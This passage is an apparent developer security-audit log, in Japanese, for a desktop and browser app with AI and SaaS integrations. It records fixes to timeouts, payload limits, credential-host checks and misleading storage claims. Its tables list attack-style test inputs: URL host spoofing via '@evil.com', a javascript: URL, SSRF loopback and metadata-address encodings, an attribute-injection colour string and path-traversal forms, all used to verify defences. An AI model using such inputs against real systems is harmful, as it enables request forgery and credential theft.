一度も渡していない**（`invoke` の payload に `maxTokens` / `model` を入れて
いる画面コードは 0 件。`web-shim.ts` の 2 件はブラウザ版が
`callProvider` を直接呼ぶ側で、IPC payload ではない）。使われていない
受け口が、有料 API のパラメータをレンダラーに握らせているだけだった。

`assistant.ts` と同じ「定数」の形へ寄せた —— `SKILLS_MAX_TOKENS = 2048` /
`BUSINESS_ADVISOR_MAX_TOKENS = 1500` / `STOCKS_ADVISOR_MAX_TOKENS = 1024`
（いずれも従来の既定値そのまま＝**挙動は変わらない**）。モデル選択は保存済み
プロバイダ設定 (`providers.ts` の `cfg.model`) 側の口が本来の道である。

これは**意図的な間口の狭め方**である。拡張点として残したいなら戻せるが、
そのときは 3 か所の検査を 1 つに寄せて上限も決めること。

検査は期待ごと反転させた —— 以前は「上書きを尊重する」ことを確かめていて、
**使われていない受け口を仕様として固定していた**。いまは数値・巨大値・負値・
`Infinity`・文字列・オブジェクト・`null` のどれを渡しても定数が出ることを見る。

対照 5 種すべて鳴る: 3 か所それぞれで payload から読む形へ戻す / `model` を
payload から読む形へ戻す / 定数の値を変える。
Stryker: `skills.ts` 121 killed / 0 survived / 0 no-cov。

`verify:arch` が `skills.ts` の行ずれを 3 件捕まえた（`x-api-key` /
`isSafeSkillName` ×2）—— 錨があるおかげでコード移動でも気付ける。

### 応答しない相手で画面が永久に止まる経路があった（修正済み）+ 「効かない timeout」を寸前で回避

`compat` プロバイダの `baseUrl` は**利用者が自由に決められる**
(LM Studio / LiteLLM / 自前サーバ / BYO プロキシ)。接続だけ受け付けて応答を
返さない相手だと、`runAiChat` の `await f(...)` は永久に返らない ——
`action:invoke` の Promise が解決せず、画面は**「読込中…」のまま止まる**。
これは `lint:ipc-handlers` を作った動機そのものの症状である。

**兄弟の片方だけ守られていた。** 同じ「利用者が宛先を決める」経路でも
`clients/ollama.ts` には 30 秒の hard timeout が入っていて理由も書いてある。

| 経路 | timeout | 応答サイズ上限 |
|---|---|---|
| `clients/ollama.ts` | ✓ 30s (理由つき) | — |
| `main.ts` の更新確認 | ✓ 10s | — |
| `network/proxy.ts` (`fetchViaProxy`) | **✗ signal を捨てていた** | ✓ `MAX_PROXY_RESPONSE_BYTES` (10MB・Content-Length と byte 単位の二段) |
| `shared/ai/chat.ts` (`runAiChat`) | **✗ 無し** | ✗ |
| `clients/types.ts` (`jsonFetch`・全 SaaS) | ✗ 無し | ✗ |

このリポジトリは**両方の守り方を知っている** (プロキシの上限判定は
`Content-Length: -1` まで considered している)。ただ一貫して当たっていなかった。

#### 危うく「効かない timeout」を入れるところだった

`runAiChat` に `signal` を足すだけでは**ブラウザ版で効かない**。
`fetchViaProxy` は `init` から url / method / headers / body だけを取り出して
自前の envelope を組み立てており、**`signal` は下の `fetch` に渡っていなかった**。
実装前に読んで気付いたので、あわせて中継するようにした。

これは 0-a-15 の別の顔である —— **守りを足すときは、その守りが通る道の全部で
効くかを確かめる。** 片方の道で黙って無効になる守りは、無いより悪い
(在ると思って別の対策をやめる)。

#### 値は判断であって、典拠のある数字ではない

`AI_CHAT_TIMEOUT_MS = 120_000`。30 秒は Ollama のローカル推論向けで、
クラウドの補完 (このアプリの `max_tokens` は 1024〜2048) には短すぎる。
長すぎれば固まったまま気づけない。2 分は「正当な補完は余裕で終わり、
固まった相手は必ず切れる」側へ倒した。呼び出し側は `timeoutMs` で上書きできる。

対照 4 種すべて鳴る: timeout を丸ごと外す / `signal` を fetch へ渡さない
(timer だけ回す) / 打ち切りの理由を握り潰す / **プロキシが signal を捨てる形へ戻す**。

#### 残していた gap → 塞いだ (同日)

`jsonFetch` (SaaS 74 本すべてが通る口) に timeout も応答サイズ上限も無かった。
判定を `src/shared/httpLimits.ts` に 1 つ置き、`proxy.ts` の写しもそこへ寄せた。

- `DEFAULT_HTTP_TIMEOUT_MS = 30_000` (`clients/ollama.ts` に揃えた)
- `MAX_HTTP_RESPONSE_BYTES = 10MiB` (`proxy.ts` が先に置いていた値)
- 上限は **Content-Length の先手** + **byte 単位の本番の門**の二段。
  ヘッダーは省略も詐称もできるので、先手だけでは守りにならない
- `withTimeout` は**呼び出し側の signal を合成する** —— 自前の打ち切りを
  足したせいで上位の打ち切りが効かなくなる形にはしない

Stryker 100% (36 killed / 0 survived)。完全性チェーンの保護対象にも追加
(上限を 10MiB → 10GiB に書き換えるだけで、実装を 1 行も触らずに守りが消えるため)。

**副産物: 検査がコードではなくモックを見ていた例が 1 件出た。**
`cursor.test.ts` の「本文が undefined でも落ちない」は、モックの `json()` が
`undefined` を返すから通っていただけで、**本物の `Response` は本文が空だと
`.json()` が `SyntaxError` で reject する** (実測)。production に一度も無い
挙動を仕様として固定していた。期待を実態へ直した (いまはサービス名つきの
読める失敗になる)。`shopify.ts` が「204 が返る口に `jsonFetch` は使えない」と
既に書いていたので、bodyless 応答が通る経路が無いことも確認済み。

### テンプレート引数の検査は 2 つあり、揃っている所と意図的に違う所がある（留めた）

`invoke('templates','export-template')` は 2 実装ある。実測した差:

| 入力 | main `validateParams` | ブラウザ `renderTemplateForWeb` |
|---|---|---|
| 10 万字の `title` | **throw** | 23 万字の SVG を出す |
| `title` に NUL | **throw** | **NUL をそのまま出す** |
| 色 `red; x` | **throw** | 既定色へ落とす (安全) |
| 色 `red` (名前つき) | **throw** | **通す** |

**揃えないのが正しい。** main の `validateParams` は **IPC 境界の番人**で、
レンダラー由来の payload が main プロセスのファイル書き出しへ渡る手前に立って
いる。ブラウザ版には**その境界が無い** —— 呼ぶのはページ自身の UI で、
ページの中で敵のスクリプトが動いているなら既に Vault ごと持って行かれている。
揃える方向はブラウザ側の緩さへ寄せる (= main の番人を外す) 側にしか働かないので、
**違いのほうを検査で留めた** (`templateParamsParity.test.ts` 21 件)。

**揃っている所**: エスケープは `shared/escape.ts` の `escapeXml` を両方が
そのまま使う (`web-templates.ts` は `const esc = escapeXml`)。再実装は無い。

#### 自分の思い込みのほうが誤りだった例

最初「色の判定も同じはず」と決めつけた検査を書いて落とした。実際は
`shared/escape.ts` が理由まで書いて**別に持っている**:

- `isHexColor` — 書き出し API の**契約**。`#RRGGBB` ちょうどだけ
- `safeColor` — **描画を止めずに危険な値だけ落とす**。`#rgb` / `#rrggbbaa` /
  英字だけの名前つきの色も通す

緩い側が通す値も引用符・空白・山括弧を含まないので属性から抜けられない
(正規表現は両端アンカーで、`$` が無いと `#0f5facff" onload="…` の先頭だけ
一致して後ろの属性ごと通る、という経緯までコメントに書いてある)。
**コードは正しく、検査の前提が誤っていた** —— そこも検査に書き残した。

対照 4 種すべて鳴る: main の長さ制限を外す / main の NUL 検査を外す /
`safeColor` の末尾アンカーを外す / `isHexColor` を `safeColor` の緩さに揃える。

#### あわせて測った、シロだったもの

- **Response モックの作りが本物とずれていないか** → `as Response` の
  キャスト 12 箇所を機械で洗い、`json` はあるが `text` が無い等の
  不足を確認。実害のある形は**前コミットで直した `cursor.test.ts` の 1 件だけ**
  で、残りは失敗経路専用のモック (引数で `text` を受ける) 等の誤検出だった

### 共有ガードを「一致」ではなく「正しさ」で測り直した → 3 つともシロ（実測）

パリティ検査は**両方に在る穴**を見つけられない (0-a-16)。一致を確かめた組に
ついて、実際の攻撃形を食わせて測り直した。**新しい欠陥は出なかった。**
同じ 30 分を使わないよう、試した入力を残す。

**1. Gmail の `buildRfc2822` (main / ブラウザ両方)**

両方とも `to` にしか `isSafeHeaderValue` を掛けていない。`subject` は?
→ **安全**。`=?UTF-8?B?...?=` へ base64 されるので出力は `[A-Za-z0-9+/=]`
だけになり、CR/LF が入らない。`body` は空行の後なので header ではない。

**2. Atlassian の送り先ホスト (`normalizeAtlassianSiteResult`)**

資格情報 (email+token の Basic 認証) がどこへ出るかを決める判定。18 形を実測:

| 入力 | 結果 |
|---|---|
| `https://x.atlassian.net@evil.com` | **deny** (host は evil.com) |
| `https://x.atlassian.net.evil.com` | **deny** |
| `https://xatlassian.net` | **deny** (ドット境界) |
| `https://atlassian.net` | **deny** (サブドメイン必須) |
| `http://x.atlassian.net` | **deny** (平文) |
| `//x.atlassian.net` | **deny** (not-a-url) |
| `javascript:alert(1)` | **deny** |
| `https://x.atlassian.net%2f@evil.com` | **deny** |
| `https://x.atlassian.net:8443` | allow → ポートを落として正規化 |
| `https://evil.com@x.atlassian.net` | allow → userinfo を落とす (host は正当) |
| `https://x.atlassian.net/wiki?a=b#c` | allow → path/query/fragment を落とす |
| `https://x.ATLASSIAN.NET` | allow → 小文字化 |

`https://evil-x.atlassian.net` が通るのは**正しい** —— 実在しうる
テナント名で、誰でも取れる。バイパスではない。

**3. 書き出し先の封じ込め (`isSafeExportPath`)**

任意パスへの書き込みを止める唯一の関門。22 形を実測。`..` を含む形・
兄弟ディレクトリ (`<root>-evil`)・根そのもの・ホーム直下・相対パス・
NUL / 改行入り・拡張子違い / 二重拡張子 / 拡張子なし・末尾スペース・
バックスラッシュ経路は**すべて deny**。

通る 2 形は読んで確かめた:

- `<root>/.svg` —— 書き出し先の中の `.svg` という名前のファイル。封じ込めも
  拡張子も満たしている
- `<root>/%2e%2e/a.svg` —— **`path.resolve` は percent-encoding を解かない**
  ので `%2e%2e` は*そういう名前のディレクトリ*であって `..` ではない。
  下流 (`shellOpenGate` の `realpath` / `extname`) も解かないので、
  実際に外へは出ない

なお `.SVG` (大文字) は deny になる。厳しすぎる側だが、書き込みの関門なので
このままでよい。

### 「トークンは OS キーチェーンに暗号化保存されます」が **2 画面**で嘘だった（修正済み）

`GoogleConnectCard`（Gmail / Calendar / Drive の 3 ページに出る）と
`Microsoft365Page` が、**条件なしで**こう書いていた:

> トークンは OS キーチェーンに暗号化保存されます。

2 通りに誤っている:

1. **ブラウザ版に OS キーチェーンは無い。** この 2 つは両方のビルドに載る。
   ブラウザ版の保存先は WebCrypto Vault (IndexedDB) である
2. **デスクトップ版でもキーチェーンが無い環境がある。** gnome-keyring /
   kwallet 不在の Linux では `secrets.ts` が `plain:` 接頭辞つきの
   **base64 難読化**へ落とす（暗号化ではない）

**`secrets.ts` 自身は正直だった** —— コンソールに「NOT real encryption」と
出し、`plain:` で印を付け、キーチェーンが戻れば自動で暗号化へ上げ直す。
「設定」ページも `storageProtection()` で実際の状態を出している。
**嘘をついていたのは画面の地の文だけ**で、しかも利用者が「トークンを
貼ってよいか」を判断する、まさにその場所だった。

直し方は条件つきで正しいことを書き、実際の状態は「設定」へ送る。
live な状態を 3 ページぶん再実装すると、このリポジトリで何度も直している
「同じ判断の N 実装」になるので採らない。

#### 掃除機を作ったら 2 件目が出た

最初に気付いたのは `GoogleConnectCard` だけ。レンダラー全体を走査する検査を
書いたら `Microsoft365Page` が出た。**目で見つけた 1 件を直すだけでは
足りなかった。**

#### その掃除機自体が、最初は守っていなかった

判定を「『キーチェーン』と『暗号化保存』が近接し、かつ**ファイル内に**
『難読化』が無ければ違反」と書いた。すると**直した文が 1 つ在るだけで
ファイル全体が免除**され、同じファイルへ断言を足しても鳴らなかった
（対照実験で判明）。出現ごとに断言そのものを見る形へ直した。

対照 4 種すべて鳴る: カードを元の断言へ戻す / Microsoft365 を元へ戻す /
但し書きだけ消す / **直した文が在るファイルへ 3 つ目の断言を足す**。

#### あわせて測った、シロだったもの

| 対象 | 結果 |
|---|---|
| プロキシの SSRF 判定 (`isPrivateOrReservedTarget`) | **35 形を実測してシロ。** 10 進 (`2130706433`) / 16 進 (`0x7f000001`) / 8 進 (`0177.0.0.1`) / 短縮 (`127.1`) / `localhost` 各種 / IPv4-mapped IPv6 (点表記・16 進とも) / IPv4-compatible / NAT64 (`64:ff9b::7f00:1`) / 6to4 (`2002:7f00:0001::`) / メタデータ / ULA / link-local / `0.0.0.0` / `[::]` / RFC1918 全域 / CGNAT (`100.64/10`) / ベンチマーク (`198.18/15`) をすべて BLOCK。`172.31.255.255` は BLOCK・`172.32.0.1` は allow で**境界も正しい**。`127.0.0.1.evil.example` が通るのは設計どおり（DNS 名の解決先はプロキシ側で見る: `docs/PROXY_EXAMPLE.md` §3） |
| ブラウザ版 `storageProtection()` が `encrypted: true` 固定 | シロ。`vault.setToken` は未解錠なら throw するので、保存されたトークンは必ず Vault を通っている |

### `SECURITY.md` の主張を実装と突き合わせた → 2 行が不正確だった（修正済み・実装は変えていない）

claim-vs-reality の軸を**セキュリティ文書そのもの**へ当てた。

**1. 「接続先改ざん … URL をハードコード。renderer / IPC ペイロードでは変更不可」**

Ollama の経路は **2 つある**:

| 経路 | 宛先 |
|---|---|
| `main/clients/ollama.ts` (サービスページ) | `http://127.0.0.1:11434` 固定・endpoint allowlist・30s timeout・10MB 上限 |
| `shared/ai/providers.ts` (AI プロバイダ層) | **利用者が設定でベース URL を変えられる** |

文書は前者だけを説明していた。後者を読んだ人が「Ollama は必ず 127.0.0.1」と
理解する形になっていた。

**2. 「API トラフィック傍受 … 全 fetcher が https のみ使用」**

実測すると平文 http は 1 つある —— `http://127.0.0.1:11434`。
loopback なので線路に出ないが、「全 fetcher が https」は字義どおりには偽。

#### 実装のコメントも実態とずれていた

`aiEndpoint.ts` は「鍵を送らない構成は **LAN の** http を許す」と書いていたが、
`credentialed: false` の実測は:

| 宛先 | credentialed=true | credentialed=false |
|---|---|---|
| `http://127.0.0.1:11434` | 通す | 通す |
| `http://192.168.1.50:11434` | **弾く** | 通す |
| `http://ollama.lan:11434` | **弾く** | 通す |
| `http://example.com:11434` | **弾く** | **通す** |
| `http://169.254.169.254/` | **弾く** | **通す** |
| `https://example.com` | 通す | 通す |
| `ftp:` / `javascript:` / `file:` | 弾く | 弾く |

つまり LAN に限っていない。**鍵を載せる側の絞りは正しく厳しい** ——
平文は loopback だけ、メタデータも弾く。

#### 絞らなかった理由（意図的な非対応）

`credentialed: false` を loopback + RFC1918 へ絞る案は検討したが**採っていない**:

- LAN かどうかを**静的に判定できない**。`http://ollama.lan` は正当な LAN 構成
  だが `http://evil.com` と字面で区別が付かない (プロキシ側は DNS 解決後の
  IP を見られるが、ここにはその委譲先が無い)
- IP リテラルだけ許すと、名前で運用している実在の LAN 構成を壊す
- この経路は **API キーを載せない**。送られるのはプロンプトで、
  宛先を決めるのは利用者自身

**ただし「公開ホストを平文で指定すればプロンプトの内容は経路上で読める」**の
は事実なので、`SECURITY.md` と実装コメントの両方に明記した。
絞る判断をするなら利用者の選択で —— そのとき `aiEndpoint.test.ts` の
「credentialed=false は通る」7 件が落ちるので、変更は必ず意図的になる。

対照 3 種すべて鳴る: `credentialed` の分岐を落とす / 鍵なし側も loopback へ
絞る / https も弾く。

#### あわせて確かめた、正しかった主張

- 「`npm audit --omit=dev` で production 0 件」→ **実行して 0 件** ✓
- 外部 SaaS の fetcher 19 ホストはすべて https ✓

### `SECURITY.md` の残りの行を突き合わせた → PKCE 行が不完全・不変条件が未固定だった

**PKCE 行**: 「OAuth リダイレクト改ざん → PKCE で `code` を verifier 必須化」と
だけ書いてあったが、**PKCE を使わない構成が 3 つある** (Notion / WordPress.com /
Atlassian 3LO —— いずれも提供側の仕様書に `code_challenge` の記載が無い)。

安全性は保たれている。仕組みが違うだけである:

| 構成 | 傍受した `code` を交換できない理由 |
|---|---|
| PKCE あり (7) | `code_verifier` を知らないと交換できない (public client でも可) |
| PKCE なし (3) | **client secret** を知らないと交換できない (confidential client) |

**危ないのは「どちらも無い」構成** —— secret を持たない public client で
PKCE も切ると、`code` を傍受しただけでトークンを取られる。今日そんな構成は
無いが、**それを保証していたのは「3 つだけ」という名前の一覧だけ**で、
「なぜ安全なのか」は誰も留めていなかった。

`pkce === false` なら `requiresClientSecret` が真であること、を検査にした。
対照 3 種すべて鳴る: **PKCE も secret も無い構成を足す (本命・4 本)** /
既存 3 つから secret 要求を外す (9 本) / PKCE を全部切る (12 本)。

#### あわせて確かめた、正しかった主張

| 主張 | 実測 |
|---|---|
| 「ループバックサーバが Host を 127.0.0.1 / localhost / [::1] のみ許可」 | **真**。`loopbackChecks.test.ts` が既に固定済み (ポート付き Host も含む) |
| 「エラーメッセージで API キーを echo していない (`slice(0,200)` のみ)」 | **真、かつ順序も正しい**。`redactForMessage` は `redactSecrets(input.slice(0, 8192)).slice(0, maxLength)` —— **伏せてから切る**。先に 200 字へ切ると、境界をまたぐ秘密が半端に残って伏字の型に当たらなくなる。`REDACT_SCAN_LIMIT` の説明にその考察まで書いてある |

### 文書が名指しした Ollama の守りを、AI プロバイダ経路が**通っていなかった**（修正済み）

`docs/OLLAMA_SECURITY.md` はこう書いている:

> ブラウザ版のみ接続先を設定できるが、許可されるのは **3 経路だけ**で、
> **平文 http による別ホスト接続は拒否する** (`isAllowedOllamaBase`)

さらに設計意図まで明記していた:

> 制約は `src/shared/ollama.ts` に 1 つだけ置き、Electron / ブラウザ / CLI の
> 3 経路で共有する（**片方だけ緩い状態を作らないため**）

**実際には片方だけ緩かった。** `isAllowedOllamaBase` は
`shared/ollama.ts` の中からしか呼ばれておらず (grep で確認)、
AI プロバイダ経路 (`shared/ai/providers.ts` の ollama spec) は
`normalizeAiBaseUrl(credentialed: false)` —— **宛先を絞らない側** —— を
通っていた。実測すると `http://example.com:11434` も
`http://169.254.169.254` も通った。

つまり **assistant / business / stocks の助言がプロンプトを平文で任意ホストへ
送れる状態**で、文書はそれを「拒否する」と書いていた。

#### 直し方: 判定を 1 つに寄せる (文書の設計意図どおり)

`isAllowedOllamaBase` をそのまま流用はできない —— あちらは
`isWellFormedBase` でパス付き URL も弾くが、プロバイダ経路は
`https://tunnel.example/ollama` のようなリバースプロキシ構成を正当に受ける。

**ホストの絞りだけ**を `isAllowedOllamaPlaintextHost` として切り出し、
`isAllowedOllamaBase` とプロバイダ経路の両方がそれを通る形にした。
経路 3 通り (ループバック / ページ自身と同じホスト / 任意の https) は
文書のまま。

`pageHostname` は Electron main では空になる (`location` が無い) ので、
デスクトップでは経路 (2) が自動的に無効化され loopback + https だけが残る。
main プロセスに「アプリを配信したホスト」の概念は無いので、これが正しい。

#### 検査が「文書の逆」を固定していた

`providers.test.ts` に **`Ollama は鍵を送らないので LAN の平文 http を通す`**
という検査があった。文書が「拒否する」と書いている挙動を、検査は「通す」と
して固定していた —— 期待ごと反転させた。

**これは意図的な間口の狭め方である。** LAN の Ollama を平文 http で使って
いた人は、ページ自身と同じホストで配信するか https にする必要がある
(どちらも文書が最初から挙げている経路)。

対照 4 種すべて鳴る: 絞りの呼び出しを外す / https も絞る (トンネルを塞ぐ) /
ループバックも弾く / ページ同一ホストの条件を落とす。

#### あわせて直した

`DATA_PROTECTION.md` の「全 fetcher HTTPS」も `SECURITY.md` と同じ理由で
不正確だったので、ローカル推論サーバ向けの例外に触れる形へ直した。

### Ollama 画面が、**同じ画面の中で**矛盾したことを言っていた（修正済み）

`OllamaPage` は 2 つの節を**どちらも無条件で**描画している:

| 節 | 内容 |
|---|---|
| 接続設定 | 接続先の**入力欄**。プレースホルダは `192.168.1.10:11434` / `https://xxx.trycloudflare.com` を勧める。直下に「指定できるのは 3 通りだけ」の正確な説明つき |
| セキュリティポリシー | 「🔒 接続先は `http://127.0.0.1:11434` に **ハードコード** (他ホストへの送信不可)」 |

前者はブラウザ版で**実際に効く** (`ollamaWeb.loadEndpointSetting()` が
localStorage から読む)。**入力欄が在る画面が「変更できない」と言っていた。**

ポリシー欄の記述はデスクトップ版の経路 (`main/clients/ollama.ts` の
`OLLAMA_BASE`) の話としては真だが、同じ画面がブラウザ版の設定 UI を出している
以上、そこだけ読んだ利用者は誤解する。すぐ上の「3 通りだけ」と同じ事実を
書く形へ直した。

対照 4 種すべて鳴る: ポリシー欄を元の断言へ戻す / 3 経路の説明を消す /
平文 http の但し書きを消す / 接続先の入力欄を消す (検査の前提が崩れる側)。

#### この画面を見つけた掃き方

「**文書やコメントが名指しした守りを、実際の経路が通っているか**」を機械で
洗った (前項の Ollama プロバイダ経路と同じ問い)。

- 守り系の export **77 件**のうち、自ファイル以外から参照が無いもの **32 件**
  → ほとんどは自ファイル内で正しく使われており問題なし
- **製品コードから一度も呼ばれていない守りは 0 件**
- Ollama の URL を組み立てうるファイル **7 件**を洗い、実際に fetch するのは
  3 件だけと確認 (`academicKnowledge.ts` の hit は DOI `10.1177/0267323111434452`
  に `11434` が含まれるだけの偽陽性、他 2 件は表示文字列)

**「呼ばれているか」では前項の穴は見つからない** —— `isAllowedOllamaBase` は
呼ばれていた (自分のファイルの中で)。見つかるのは「**その経路が通っているか**」
を問うたときだけである。ゲートにはしていない: 32/77 が良性で精度が低く、
このリポジトリの方針 (精度の低いゲートは作らない) に合わないため。

### Ollama 画面のセキュリティポリシー欄が、**デスクトップ版の数字だけ**を書いていた（修正済み）

前項で 1 つ目の項目 (接続先) を直したので、残り 4 つも実装と突き合わせた。

| 項目 | 判定 |
|---|---|
| 書き込みエンドポイントを呼ばない | ✓ `OLLAMA_READ_PATHS` は `shared/ollama.ts` にあり両ビルド共通 |
| モデル名の正規表現 | **表示が実物と違った** —— 画面は `^[a-z0-9][a-z0-9._:/-]*$`、実物は `/^[a-z0-9][a-z0-9._:/-]{0,127}$/i` (**長さ上限 128 と大小無視**が落ちていた) |
| タイムアウトと応答上限 | **ビルドで違うのに 1 つしか書いていなかった** |
| Streaming 未対応 | ✓ |

数字の実測:

| | 画面の主張 | デスクトップ | ブラウザ |
|---|---|---|---|
| タイムアウト | 30 秒 | 30 秒 ✓ | 疎通確認 **5 秒** / チャット **120 秒** |
| 応答上限 | 10 MB | 10 MB ✓ | **2 MB** |

チャットの待ち時間は**主張の 4 倍**だった。応答上限は逆に厳しい側だが、
どちらも「画面に書いてある値と実際に効く値が違う」ことに変わりはない。

**直し方**: 数字を 2 か所に書くとまたずれるので、`ollamaWeb.ts` の定数を
export して**画面がそこから描画する**形にした。台帳として
「定数を JSX で使っていること」と「古い直書きの一文が無いこと」の両方を検査する。

対照 4 種すべて鳴る: 数字を直書きへ戻す / 定数の使用だけ消す (import は残す) /
正規表現の表示から長さ上限を落とす / 実物の正規表現を変える。

### 画面が言うパスワード最小長が、強制される値と違っていた（修正済み）

画面に直書きされた「数字 + 単位」を 37 箇所洗い、実装と突き合わせた。

**食い違っていたのは 1 件:**

| 場所 | 値 |
|---|---|
| `vault.ts` `MIN_PASSWORD_LENGTH` | **12** ← 実際に強制する側 (`initialize` / `changePassword` の両方で検査) |
| `LockScreen` の placeholder | 12 (合っていたが直書き) |
| **`SettingsPage.changePassword`** | **`< 8` で事前検査し「8 文字以上にしてください」** |

10 文字を入れると、まず「**8 文字以上**にしてください」と言われ (通ると読める)、
その後 vault が「**12 文字以上**」で弾く。守り自体は `vault.ts` にあるので
**破れてはいない**が、画面が嘘の規則を教えていた。

**直し方**: 数字を 2 か所に持たない。3 箇所とも `MIN_PASSWORD_LENGTH` から描く。

あわせて、クリップボード消去も同じ形だった —— 本文の「30 秒後に自動消去」と
`setTimeout(..., 30_000)` が別々に書かれていた。`CLIPBOARD_WIPE_MS` へ寄せた。

対照 4 種すべて鳴る: 閾値を 8 へ戻す / placeholder を直書きへ戻す /
秒数を直書きへ戻す / `vault` の定数を非 export にする。

#### モックにも同じ規律を当てた

`LockScreen.test.ts` の `vi.mock('../vault')` に `MIN_PASSWORD_LENGTH` を
足す必要があったが、**`12` と直書きすると定数を変えたときにモックだけ古くなる**
—— 「画面と定数がずれていないか」を見ている当の検査が嘘をつく。
`importOriginal` で本物を読み直して再輸出する形にした。

#### 残り 36 箇所はシロ

税率・「過去 30 日のトレンド」・出典の説明など、**コードが強制している値では
ない**地の文だった。強制値と対応するものだけが問題になる。

### 入力の上限が**ブラウザ版にだけ**あり、IPC の信頼境界には無かった（修正済み）

レンダラーの長さ検証 336 箇所を洗い、main 側の同じ項目と突き合わせた。
**食い違っていたのは emotions の 2 つ**で、しかも**向きが逆**だった:

| 項目 | ブラウザ (`web-shim.ts`) | main (`clients/emotions.ts`) |
|---|---|---|
| `analyze-text` の `text` | 5000 字で断る | **空でなければ通す (上限なし)** |
| `log-mood` の `note` | 2000 字で断る | **`String(note ?? '')` —— 検査なし** |

`main` はレンダラーから来た payload を最初に受ける**信頼境界**なのに、
そこだけ上限が無かった。`text` は Anthropic の要求本文へそのまま載り
(有料 API へ任意長を送れる)、`note` は気分ログとして**保存される**
(保存先が際限なく育つ)。

テンプレートの `validateParams` は逆に main だけが厳しく、**あちらは正しい**
—— main がファイル書き出しの手前に立っているため。ここは境界の側が緩い
という逆向きの欠けだった。

**直し方**: 値は `src/shared/emotionsLimits.ts` に 1 つだけ置き、両ビルドが
そこから読む。ブラウザ版が既に運用していた値をそのまま採る (厳しい側へ
寄せるのではなく、**利用者から見た挙動を変えない**側へ揃える)。

対照 3 種が鳴る: text の上限を外す / note の上限を外す / 上限を 10 倍に緩める。
4 つ目に用意した「断る前に API を呼ぶ順序へ変える」は**綺麗に切り出せなかった**
(移動先で構造が壊れ、無関係な検査が落ちる)。順序の主張は
`expect(fetchMock).not.toHaveBeenCalled()` として 1 つ目の対照に同居している。

#### ARCHITECTURE の emotions 行が 2 つとも誤っていた

`verify:arch` の行ずれをきっかけに読んだら、内容も違っていた:

| 行 | 書いてあったこと | 実際 |
|---|---|---|
| `log-mood` | payload は `{ text, mood, source? }`・**text 32KB clamp** | payload は `{ date?, score, note? }`・32KB clamp は**存在しない** |
| `analyze-text` | **text 32KB clamp** + extractJson | clamp は**存在しなかった** (今回 5000 を新設) |

「32KB clamp」は Ollama 行 (`ollama.ts` の `prompt.slice(0, 32768)`) からの
**写し間違い**と見られる。**存在しない守りを 2 行にわたって書いていた。**

#### あわせて測った、シロだったもの

| 対象 | 結果 |
|---|---|
| advisor の `question` 上限 | **一致** (main / stocks / web-shim すべて 1000) |
| Ollama の `system` / `prompt` クランプ | **一致** (8192 / 32768)。`OLLAMA_SECURITY.md` の「Electron 版と同じ検証を通す」は真。ブラウザ側は `8_192` / `32_768` と下線付きで書かれており、素朴な grep では見落とす |
| `validateAdvisorJson` の各上限 | 既に `advisorValidationParity.test.ts` で固定済み |

### IPC action 表の payload 欄が実装と 6 行ずれていた（修正済み・ゲート化した）

この表は「**レンダラーから main へ何が渡るか**」を示す唯一の一覧である。
行番号のずれは `verify:arch` が捕まえていたが、**中身のずれ**は誰も見ていなかった。
19 行を機械で突き合わせたら 6 行が違った:

| 行 | ずれ |
|---|---|
| `skills.run-skill` | 文書に `model` / `maxTokens` が残っていた —— **私が payload から外した**のに表が古いまま |
| `cloudflare.purge-cache` | **`purgeEverything` が載っていなかった** —— ゾーン全体のキャッシュを落とす破壊的なフラグ |
| `wordpress.create-post` | `status` (publish 指定) が載っていなかった |
| `github.create-issue` | `labels` が欠けていた |
| `calendar.create-event` | `location` / `timeZone` が欠けていた |
| `cloudflare.create-dns-record` | `proxied` が欠けていた |

**欠けている側も問題である** —— 表の目的は攻撃面を示すことなので、
`purgeEverything` のような破壊的フラグが載っていないと読んだ人が誤解する。

#### ゲートにした

`verify:arch` に `verifyActionPayloads` を足した。表の `` `{ a, b?, c }` `` を
実装の `interface XxxPayload` と集合で比べる (action 名から interface 名を導く)。
19 行中 18 行に対応する interface があり、**精度は 100%** (偽陽性 0)。

作る過程で 2 度、**自分の走査が偽陽性を出した**:

- 型注釈中のコメント (`// 2026-01-01T10:00:00`) をフィールド名と読み、
  `00` / `01T10` という存在しない欄を報告した → コメント行を落としてから取る
- `head -4` で grep を切ったせいで、`main` が `validateScanUrl` を呼んで
  いないように見えた → **実際は呼んでいる** (`security.ts:282`)。
  出力を切り詰めたまま結論を出さないこと

自己検査に 7 形 (実物 / 文書だけ / 実装だけ / 一致 / `?` 付き /
interface 無し / 未知サービス)。実物での対照も 2 種鳴る ——
表を古い状態へ戻す / 実装からフィールドを消す。

#### あわせて確かめた、正しかった主張

| 主張 | 実測 |
|---|---|
| `security.scan-url` は `validateScanUrl` を通る | **真** (`security.ts:282`)。ブラウザ側も同じ共有関数 |
| `gmail.create-draft` は `isSafeHeaderValue(to)` | 真 (前回確認済み) |
| `ollama.chat` は `isSafeModelName` + NUL 拒否 + 32KB/8KB clamp | 真 (前回確認済み) |

### 変異検査の対象一覧に、ブラウザ版の橋 (`web-shim.ts`) が入っていなかった (実測 8.34%)

`stryker.config.json` の `_commentScope` は対象を
「**pure-logic modules, plus the main-process gates and the preload bridge**」
と書いている。`preload.ts` は対象で 100%、`main.ts` も 100%、74 個の
`clients/*.ts` も対象。**ブラウザ版で同じ仕事をしている `web-shim.ts` (1282 行)
だけが一覧に無かった。** 除外の理由はどこにも書かれていない。

一覧に入れずに実測した (2026-08-22):

```
最初        総合  8.34% / 覆われた分 49.79% / killed 118 / survived 119 / no coverage 1178
+ 応答検査   総合 15.62% / 覆われた分 60.88% / killed 221 / survived 142 / no coverage 1052
+ 履歴と送り先 総合 22.26% / 覆われた分 53.75% / killed 315 / survived 271 / no coverage  829
+ 直接続の可否 総合 25.44% / 覆われた分 54.63% / killed 360 / survived 299 / no coverage  756
```

**最初は 1178 件 (83%) がどのテストにも触られていなかった。** これが動かない事実の方。

足したのは security に効く 4 つだけ:
1. `validateAdvisorJson` (外部 LLM の応答の関門) を export してパリティ検査
2. `sanitizeAssistantTurns` (送信量と課金を止める唯一の上限) を export して直検査
3. 各 `call*` の**送り先 URL とヘッダ** —— 鍵が `x-api-key` だけに載ることまで
4. **ブラウザ直接続の可否を守っているか** —— `browserDirect: false` の提供元
   (とくに送り先を利用者が指定する `compat`) が直接叩かれないこと

**未到達は 1178 → 756 (-422)、killed は 118 → 360。** `survived` が増え、
「覆われた分」の率が一度下がっているのは、未到達だった塊が覆われた側へ移り、
そこがまだ全部は留まっていないため —— **未到達が生存に変わるのは前進**である
(生存は「テストが通っている経路にある」= 次に留める対象が見えている状態)。

`survived 119` は**そのまま鵜呑みにしない**。security 上いちばん効く 1 件
